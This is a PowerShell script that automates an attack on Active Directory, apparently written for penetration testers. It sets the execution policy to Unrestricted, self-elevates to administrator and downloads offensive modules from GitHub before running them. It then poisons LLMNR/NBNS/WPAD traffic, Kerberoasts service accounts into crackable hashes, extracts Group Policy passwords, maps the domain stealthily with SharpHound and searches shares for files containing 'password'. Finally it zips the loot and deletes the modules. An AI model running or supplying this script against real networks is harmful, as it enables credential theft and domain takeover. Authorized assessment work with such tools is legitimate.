param(
  [Parameter(Position=1)][string]$option
)
Write-Host "###########################################################################################################" -ForegroundColor Green
Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.2                                    ##" -ForegroundColor Green
Write-Host "##   Developed By @Haus3c                                                                                 ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
Write-Host "###########################################################################################################" -ForegroundColor Green
Set-ExecutionPolicy Unrestricted
#run as Admin check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}

$directory = split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
Write-Host "Using directory $directory"
Write-Host "Creating Capture folder..." 
$path = $directory + "\Capture"
$zip = $directory + "\Captured"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path | Out-Null
	  Write-Host "Created $path!" -ForegroundColor Green
	  Write-Host "Capture folder located at $path" -ForegroundColor Green
}
else
{
	Write-Host 	"Failed to create the capture folder, does it already exist?" -ForegroundColor Red
}
$client = New-Object System.Net.WebClient
$ErrorActionPreference= 'silentlycontinue'
$modulepath=$env:psmodulepath.split(';')[0].split(' ')
function RunLocal 
{
#Inveigh
	If(!(test-path $modulepath/Inv))
	{
		New-Item -ItemType Directory -Force -Path $modulepath/Inv | Out-Null
	}
	Copy-Item "$path/Inv.ps1" -Destination "$modulepath/Inv/Inv.psm1"
	If (Test-Path $modulepath/Inv/Inv.psm1 -PathType Leaf)
		{
			Write-Host "Copy Successful" 
			Import-Module Inv.psm1
			Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
			Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
		}
	else
		{
			Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
		}
#Kerberoast
	If(!(test-path $modulepath/Kerberoast))
	{
		New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
	}
	Copy-Item "$path/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
	If (Test-Path $modulepath/Kerberoast/Kerberoast.psm1 -PathType Leaf)
		{
			Write-Host "Copy Successful"
			Import-Module Kerberoast.psm1
			Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
			Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
		}
	else
		{
			Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
		}
#Sharphound EXE
	If(!(test-path $modulepath/Sharp))
	{
		New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
	}
	Copy-Item "$path/Sharphound.exe" -Destination "$modulepath/Sharp/Sharp.exe"
		If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Write-Host "Running SharpHound" -ForegroundColor  Yellow
				& "$modulepath/Sharp/Sharp.exe" --Stealth --JSONfolder $path
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
#PrivEsc
	If(!(test-path $modulepath/PrivEsc))
	{
      New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
	}
	Copy-Item "$path/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
		If (Test-Path $modulepath/PrivEsc/PrivEsc.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Import-Module PrivEsc.psm1
				Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
				Invoke-AllChecks | Out-File $path\PrivEsc.txt
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
#GPP
	If(!(test-path $modulepath/GPP))
	{
      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
	}
	Copy-Item "$path/Get-GPPPassword.ps1" -Destination "$modulepath/GPP/GPP.psm1"
		If (Test-Path $modulepath/GPP/GPP.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Import-Module GPP.psm1
				Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
				Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
#PowahView
	If(!(test-path $modulepath/PView))
	{
      New-Item -ItemType Directory -Force -Path $modulepath/PView | Out-Null
	}
	Copy-Item "$path/PowerView.ps1" -Destination "$modulepath/PowerView/PView.psm1"
		If (Test-Path $modulepath/PView/PView.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Write-Host "Importing module..."
				Import-Module PView.psm1
				Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
				Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
				Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
				#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
				Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
				Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
				Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
				Write-Host "Searching for file servers..."
				Get-NetFileServer | Out-File $path\FileServers.txt
				Write-Host "Checking for attached shares..."
				Get-NetShare | Out-File $path\NetShare.txt
				Write-Host "Grabbing Domain Policy..."
				Get-DomainPolicy | Out-File $path\DomainPolicy.txt
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}
function RunExternal
{
#Inveigh
	If(!(test-path $modulepath/Inv))
	{
		New-Item -ItemType Directory -Force -Path $modulepath/Inv | Out-Null
	}
		Write-Host "Fetching Inveigh module..."
		$client.DownloadFile("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1","$modulepath/Inv/Inv.psm1")
		If (Test-Path $modulepath/Inv/Inv.psm1 -PathType Leaf)
		{
			Write-Host "Download Successful" 
			Import-Module Inv.psm1
			Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
			Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
		}
		else
		{
		Write-Host "Error downloading from GitHub " -ForegroundColor Red
		}
#Kerberoast
	If(!(test-path $modulepath/Kerberoast))
	{
		New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
	}
		Write-Host "Fetching Kerberoast module..."
		$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
		If (Test-Path $modulepath/Kerberoast/Kerberoast.psm1 -PathType Leaf)
		{
			Write-Host "Download Successful"
			Import-Module Kerberoast.psm1
			Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
			Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
		}
		else
		{
		Write-Host "Error downloading from GitHub " -ForegroundColor Red
		}
#Sharphound EXE
	If(!(test-path $modulepath/Sharp))
	{
		New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
	}
		Write-Host "Fetching Sharphound.exe..."
		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
		$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
		If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
		{
			Write-Host "Download Successful" 
			Write-Host "Running SharpHound" -ForegroundColor  Yellow
			& "$modulepath/Sharp/Sharp.exe" --Stealth --JSONfolder $path
		}
		else
		{
			Write-Host "Error downloading from GitHub " -ForegroundColor Red
		}
#PrivEsc
	If(!(test-path $modulepath/PrivEsc))
	{
      New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
	}
		Write-Host "Fetching PowerUp module..."
		$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
		If (Test-Path $modulepath/PrivEsc/PrivEsc.psm1 -PathType Leaf)
		{
			Write-Host "Download Successful" 
			Import-Module PrivEsc.psm1
			Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
			Invoke-AllChecks | Out-File $path\PrivEsc.txt
		}
		else
		{
			Write-Host "Error downloading from GitHub " -ForegroundColor Red
		}
#GPP Password check
	If(!(test-path $modulepath/GPP))
	{
      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
	}
		Write-Host "Fetching GPPP module..." 
		$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
		If (Test-Path $modulepath/GPP/GPP.psm1 -PathType Leaf)
		{
			Write-Host "Download Successful" 
			Import-Module GPP.psm1
			Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
			Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
		}
		else
		{
			Write-Host "Error downloading from GitHub " -ForegroundColor Red
		}
#PowahView
	If(!(test-path $modulepath/PView))
	{
      New-Item -ItemType Directory -Force -Path $modulepath/PView | Out-Null
	}
		Write-Host "Fetching PowerView module..." 
		$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PView.psm1")
		If (Test-Path $modulepath/PView/PView.psm1 -PathType Leaf)
		{
			Write-Host "Download Successful" 
			Write-Host "Importing module..."
			Import-Module PView.psm1
			Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
			Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
			Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
			Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
			Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
			Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
			Write-Host "Searching for file servers..."
			Get-NetFileServer | Out-File $path\FileServers.txt
			Write-Host "Checking for attached shares..."
			Get-NetShare | Out-File $path\NetShare.txt
			Write-Host "Grabbing Domain Policy..."
			Get-DomainPolicy | Out-File $path\DomainPolicy.txt
		}
		else
		{
			Write-Host "Error downloading from GitHub " -ForegroundColor Red
		}
}
switch ($option)
{
   local 
    {
        RunLocal
    }
   external
    {
        RunExternal 
    }
}
#Zip it all up and remove leftovers
Compress-Archive -Path $path -DestinationPath $zip
Remove-Item -Recurse -Force "$modulepath/Inveigh"
Remove-Item -Recurse -Force "$modulepath/Kerberoast"
Remove-Item -Recurse -Force "$modulepath/PrivEsc"
Remove-Item -Recurse -Force "$modulepath/Sharp"
Remove-Item -Recurse -Force "$modulepath/PView"
Remove-Item -Recurse -Force "$modulepath/GPP"							
Write-Host "Done! Results stored in the Capture.zip file!" -ForegroundColor Green


